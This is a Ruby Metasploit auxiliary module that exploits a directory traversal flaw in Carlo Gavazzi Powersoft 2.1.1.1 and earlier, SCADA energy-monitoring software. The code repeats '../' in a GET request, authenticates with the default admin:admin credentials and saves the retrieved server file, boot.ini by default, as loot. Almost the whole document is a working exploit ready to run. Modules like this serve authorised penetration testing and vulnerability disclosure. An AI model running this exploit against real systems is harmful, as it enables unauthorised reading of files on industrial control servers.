 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Carlo Gavazzi Powersoft Directory Traversal&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a directory traversal vulnerability
                found in Carlo Gavazzi Powersoft <= 2.1.1.1. The vulnerability
                is triggered when sending a specially crafted GET request to the
                server. The location parameter of the GET request is not sanitized
                and the sendCommand.php script will automatically pull down any
                file requested
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://gleg.net/agora_scada_upd.shtml&#039;]
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 21 2015&#039;))
 
        register_options(
            [
                OptInt.new(&#039;DEPTH&#039;, [ false, &#039;Levels to reach base directory&#039;, 8]),
                OptString.new(&#039;FILE&#039;, [ false, &#039;This is the file to download&#039;, &#039;boot.ini&#039;]),
                OptString.new(&#039;USERNAME&#039;, [ true, &#039;Username to authenticate with&#039;, &#039;admin&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Password to authenticate with&#039;, &#039;admin&#039;]),
                Opt::RPORT(80)
            ], self.class )
    end
 
    def run
 
    require &#039;base64&#039;
 
    credentials = Base64.encode64("#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
 
    depth = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "/" + ("../" * depth)
 
    res = send_request_raw({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "#{levels}#{datastore[&#039;FILE&#039;]}?res=&valid=true",
        &#039;headers&#039;   =>   {
            &#039;Authorization&#039; =>   "Basic #{credentials}"
        },
    })
 
    if res and res.code == 200
        loot = res.body
        if not loot or loot.empty?
            print_status("File from #{rhost}:#{rport} is empty...")
            return
        end
        file = ::File.basename(datastore[&#039;FILE&#039;])
        path = store_loot(&#039;carlo.gavazzi.powersoft.file&#039;, &#039;application/octet-stream&#039;, rhost, loot, file, datastore[&#039;FILE&#039;])
        print_status("Stored #{datastore[&#039;FILE&#039;]} to #{path}")
        return
    end
 
    end
end

